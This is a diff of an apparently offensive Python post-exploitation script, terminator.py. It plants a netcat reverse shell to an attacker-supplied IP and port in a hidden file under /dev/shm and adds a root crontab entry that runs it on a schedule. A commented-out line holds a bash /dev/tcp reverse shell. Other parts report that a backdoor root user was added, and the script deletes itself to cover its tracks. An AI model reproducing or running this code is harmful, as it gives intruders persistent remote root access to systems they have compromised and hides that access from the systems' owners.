@@ -549,17 +549,19 @@ def callback(local_ip, local_port):
    print("\n### creating callback script for {}:{} ###".format(local_ip,local_port))
    os.system("mkdir /dev/shm/.data")
    os.system("touch /dev/shm/.data/data_log")
-   os.system("echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f' > /dev/shm/.data/data_log".format(local_ip,local_port))
+   os.system("echo '#!/bin/bash' > /dev/shm/.data/data_log")
+   os.system("echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f' >> /dev/shm/.data/data_log".format(local_ip,local_port))
    os.system("chmod 100 /dev/shm/.data/data_log")
-   os.system("chmod 700 /dev/shm/.data/")
-   print("\n### callback placed at /dev/shm/.data/data_log ###")
-   #os.system("echo 'bash -i >& /dev/tcp/{}/{} 0>&1' > /dev/shm/.data/data-log.sh".format(local_ip,local_port))
+   os.system("chmod 100 /dev/shm/.data/")
+   print("\n### callback placed at /dev/shm/.data/data_log... catch shell with 'nc -nlvp {}' on local machine ###".format(local_port))
+   #os.system("echo 'bash -i >& /dev/tcp/{}/{} 0>&1' > /dev/shm/.data/data-log".format(local_ip,local_port))
 
 
 # create cronjob for executing callback script every 5 min
 def cron_make():
    print("\n### creating cronjob to execute callback every 5 min... ###\n---cronjob: '5 * * * * /bin/bash /dev/shm/.data/data_log'---")
-   os.system("echo '5 * * * * /bin/bash ./dev/shm/.data/data_log' >> /etc/crontab")
+   os.system("echo '5 * * * * root /dev/shm/.data/data_log' >> /etc/crontab")
+   os.system("echo '' >> /etc/crontab")
    print("\n### cronjob created ###")
 
 
@@ -707,6 +709,7 @@ def clear_tracks(username,password,local_ip,local_port):
    print("- user {}:{} was added with root privileges".format(username,password))
    print("- nc reverse shell callback implanted at /dev/shm/.data/data_log")
    print("- cronjob created to execute nc reverse shell callback every 5 minutes to {}:{}\n".format(local_ip,local_port))
+   print("-- to catch shell run 'nc -nlvp {}' on local machine\n".format(local_port))
 
    # delete terminator.py file
    os.system("rm -f terminator.py")
